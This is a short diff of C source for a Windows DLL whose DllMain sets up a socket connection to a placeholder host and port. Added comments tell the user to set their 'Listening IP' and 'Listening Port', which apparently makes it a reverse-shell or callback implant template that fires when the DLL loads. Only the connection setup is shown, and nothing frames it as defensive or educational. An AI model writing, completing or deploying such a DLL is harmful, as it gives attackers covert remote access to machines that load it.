@@ -4,7 +4,7 @@
 #pragma comment(lib, "ws2_32.lib")
 
 #define HOST "192.168.x.x"
-#define PORT ###
+#define PORT ####
 
 BOOL APIENTRY DllMain(
     HANDLE hModule,       // Handle to DLL module
@@ -25,7 +25,9 @@ BOOL APIENTRY DllMain(
 
             // Setup connection settings
             sa.sin_family = AF_INET;
+            // Remember to set your Listening Port at the top
             sa.sin_port = htons(PORT);
+            // Remember to set your Listening IP at the top
             sa.sin_addr.s_addr = inet_addr(HOST);
 
             // Attempt to connect
